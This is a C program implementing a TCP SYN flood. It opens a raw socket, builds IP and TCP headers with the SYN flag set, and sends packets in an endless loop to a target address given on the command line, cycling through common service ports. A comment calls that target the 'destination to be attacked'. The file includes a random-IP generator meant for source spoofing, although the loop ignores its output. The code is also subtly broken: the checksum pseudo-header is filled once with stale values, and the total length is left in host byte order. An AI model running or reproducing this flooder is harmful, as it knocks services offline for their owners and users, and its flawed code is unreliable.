#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <errno.h>
#include <time.h>
#include <arpa/inet.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>

//generate random ip address between 11.0.0.0-126.255.255.254
//10.0.0.0 is reserved for private networks
//127.0.0.0 and onwards ranges are reserved for loopback, link-local addresses etc
//for last octet 254 max value since 255 is for broadcast
char* randomIP(){
	//assign different value to srand each time to be able to generate different random number each time
	//srand(time(NULL));
	
	//generate random numbers per octets
	int random1=11+rand()%116;
	int random2=rand()%256;
	int random3=rand()%256;
	int random4=1+rand()%254;
	
	//allocate memory to avoid segmentation error
	char* ip=(char*)malloc(16*sizeof(char));
	
	//combine random numbers to form random ip
	sprintf(ip, "%d.%d.%d.%d", random1, random2, random3, random4);
	
	return ip;	
}

//calculating checksum with parameters pointer to buffer (*ptr) and number of bytes in buffer (nbytes)
//returns short value since check field in headers is 16 bits
unsigned short checksum(unsigned short *ptr,int nbytes){
    
	register long sum=0;	//long variable for 32 bits space stored in register for faster access
 	
 	//16 bit chunks values pointed by ptr summed up
	while(nbytes>1){
		sum+=*ptr++;
		nbytes-=2;
    	}
    
    	//if 8 bit chunk left so added as char
    	if(nbytes==1){
        	sum+=*(unsigned char*)ptr;
    	}
 
    	sum=(sum>>16)+(sum & 0xffff);	//adds shifted upper 16 bits to (0xffff) lower 16 bits
    	sum+=(sum>>16);			//adds remaining carry bits from previous addition
    
    	unsigned short result=(unsigned short)~sum;	//calculates one's complement
     
    	return result;
}

void printPacket(const unsigned char* packet, size_t length) {
    // Cast the packet buffer to the IP header structure
    const struct iphdr* ip_header = (const struct iphdr*)packet;

    // Check if the packet length is valid
    if(length<sizeof(struct iphdr)) {
        printf("Invalid packet length\n");
        return;
    }

    // Print IP header fields
    printf("IP Header\n");
    printf(" - Version: %u\n", ip_header->version);
    printf(" - Header Length: %u bytes\n", ip_header->ihl * 4);
    printf(" - Protocol: %u\n", ip_header->protocol);
    printf(" - Source IP: %s\n", inet_ntoa(*(struct in_addr*)&ip_header->saddr));
    printf(" - Destination IP: %s\n", inet_ntoa(*(struct in_addr*)&ip_header->daddr));
    printf(" - Total Length: %d\n", ntohs(ip_header->tot_len));
    printf(" - Fragment Offset: %d\n", ntohs(ip_header->frag_off));
    printf(" - Identification: %d\n", ntohs(ip_header->id));
    printf(" - Time to Live (TTL): %d\n", ip_header->ttl);
    printf(" - Checksum: %hu\n", ip_header->check);
    printf("\n");

    // Calculate the offset to the TCP header
    size_t ip_header_length = ip_header->ihl * 4;
    const struct tcphdr* tcp_header = (const struct tcphdr*)(packet + ip_header_length);

    // Check if the packet length is valid
    if (length < ip_header_length + sizeof(struct tcphdr)) {
        printf("Invalid packet length\n");
        return;
    }

    // Print TCP header fields
    printf("TCP Header\n");
    printf(" - Source Port: %u\n", ntohs(tcp_header->source));
    printf(" - Destination Port: %u\n", ntohs(tcp_header->dest));
    printf(" - Sequence Number: %u\n", ntohl(tcp_header->seq));
    printf(" - Acknowledgment Number: %u\n", ntohl(tcp_header->ack_seq));
    printf(" - Flags: 0x%02X\n", tcp_header->syn + (tcp_header->ack << 1) + (tcp_header->fin << 2) + (tcp_header->rst << 3) + (tcp_header->psh << 4) + (tcp_header->urg << 5));
    printf(" - Window Size: %u\n", ntohs(tcp_header->window));
    printf(" - Urgent Pointer: %hu\n", ntohs(tcp_header->urg_ptr));
    printf(" - Data Offset: %d\n", tcp_header->doff);
    printf(" - Checksum: %hu\n", tcp_header->check);
}

//structure used to calculate checksum
struct pseudo_header{
	unsigned int src_addr;
	unsigned int dst_addr;
	unsigned char protocol;
	unsigned char placeholder;
	unsigned short tcp_length;
	struct tcphdr tcp_hdr;
};

int main(int argc, char *argv[]){
	//initialize with 0, 2048 bytes of buffer (reasonable amount of memory) to store packet
	char buffer[2048];
	memset(buffer, 0, 2048);
	
	//address of destination to be attacked from argument
	in_addr_t dst_address=inet_addr(argv[1]); 
	
	//source port converted to network byte order big endian (standard for network communication)
	unsigned short src_port=htons(8080);
	
	//destination ports (commonly used for tcp communication)
	//80: HTTP, 443: HTTPS, 3128, 8080: HTTP proxy, 8888, 4433, 8443, 8447, 8444: Common alternatives
	//21: FTP, 22: SSH, 23: Telnet, 25: SMTP, 53: DNS, 1723: Tunneling, 1194: OpenVPN
	//3306: MySQL, 1433: SQL Server, 5432: Postgre, 1521: Oracle, 27017: Mongo
	//3389: Remote Desktop, 161: Network management, 123: Network time, 389: Directory, 5060, 5061: VoIP
	unsigned short dst_ports[]={80, 443, 3128, 8080, 8888, 4433, 8443, 8447, 8444, 21, 22, 23, 25, 53, 1723, 1194, 3306, 1433, 5432, 1521, 27017, 3389, 161, 123, 389, 5060, 5061};
	
	//pointer for ip header pointing to buffer
    	struct iphdr *ip_header = (struct iphdr *) buffer;
    	
    	//pointer for tcp header pointing to address after ip header
    	struct tcphdr *tcp_header = (struct tcphdr *) (buffer + sizeof (struct ip));
    	
    	//defining socket address structure except port
    	struct sockaddr_in sin;
    	sin.sin_family = AF_INET;
    	sin.sin_addr.s_addr=dst_address;

	//create raw socket of IPv4, TCP Protocol
	//integer returned is socket file desriptor
	int raw_socket=socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
	if (raw_socket < 0) {
        	perror("Failed to create socket");
        	return -1;
    	}
    	
    	//set IP_HDRINCL option to 1 using setsockopt function to tell kernel not to include its own ip header
    	int enable = 1;
    	if(setsockopt(raw_socket, IPPROTO_IP, IP_HDRINCL, &enable, sizeof(enable))<0){
        	perror("Failed to set IP_HDRINCL option to 1");
        	return -1;
    	}
	
	//defining ip header except saddr and id fields
    	ip_header->daddr=dst_address;
	ip_header->version=4;
    	ip_header->protocol=IPPROTO_TCP;
	ip_header->ihl=5;	//internet header length typically 5 words(20 bytes)
	ip_header->tos=0;	//type of service(quality of sevice) set to 0
	ip_header->tot_len=sizeof(struct ip) + sizeof(struct tcphdr);	//total length of ip packet
	ip_header->frag_off=0;	//defining no fragmentation
    	ip_header->ttl=255;	//time to live set to max
    	ip_header->check=0;	//checksum set to 0 first so non-zero value does not interfere in calculation
    	
    	//defining tcp header except dest field
    	tcp_header->source=src_port;
    	tcp_header->seq=0;	//initial sequence number
    	tcp_header->ack_seq=0;	//no acknowledgment expected
    	tcp_header->window=htons(5840);
    	tcp_header->doff=5;	//tcp header length typically set to 5 words(20 bytes)
    	tcp_header->urg_ptr=0;	//no urgent data
    	tcp_header->fin=0;
    	tcp_header->syn=1;	//request type set to syn
    	tcp_header->rst=0;
    	tcp_header->psh=0;
    	tcp_header->ack=0;
    	tcp_header->urg=0;
    	tcp_header->check = 0;	//non-zero value can interfere with calculation
    	
    	//defining structure for checksum calculation
    	struct pseudo_header ps_header;
    	ps_header.src_addr=ip_header->saddr;
    	ps_header.dst_addr=ip_header->daddr;
    	ps_header.protocol=ip_header->protocol;
    	ps_header.placeholder=0;
    	ps_header.tcp_length=htons(sizeof(struct tcphdr));
    	memcpy(&ps_header.tcp_hdr, tcp_header, sizeof(struct tcphdr));
    	
    	srand(time(NULL));
    	int total_ports=sizeof(dst_ports)/sizeof(dst_ports[0]);
    	int ports_count=0;
    	int packets_count=0;
    	while(1){
    		//random ip generated and converted into its binary format to be stored in header
    		//random 5 digit id given to ip header
		char* random_ip=randomIP();
		in_addr_t src_address = inet_addr("192.168.1.2");
    		ip_header->saddr=src_address;
    		ip_header->id=htons(10000+rand()%90000);
    		
    		//destination ports set in tcp header and sin structure one after another
    		tcp_header->dest=htons(dst_ports[ports_count]);
    		sin.sin_port=htons(dst_ports[ports_count]);
    		
    		//calculating and setting checksums
    		ip_header->check=checksum((unsigned short *)ip_header, sizeof(struct iphdr));
    		tcp_header->check=checksum((unsigned short*)&ps_header, sizeof(struct pseudo_header));
    	
    		//send packet and store value returned that is number of bytes succesfully sent
    		int result=sendto(raw_socket, buffer, ip_header->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
    		
    		if(result<0){
			printf("Error occurred while sending packet.\n");
		}
		else{
			packets_count++;
			ports_count++;
    			if(ports_count==total_ports){
    				ports_count=0;	
    			}
    			
			printf("Packet %d Sent.\n", packets_count);
			printPacket(buffer, ip_header->tot_len);
		}
		
		free(random_ip);
    	}
	
	return 0;
}
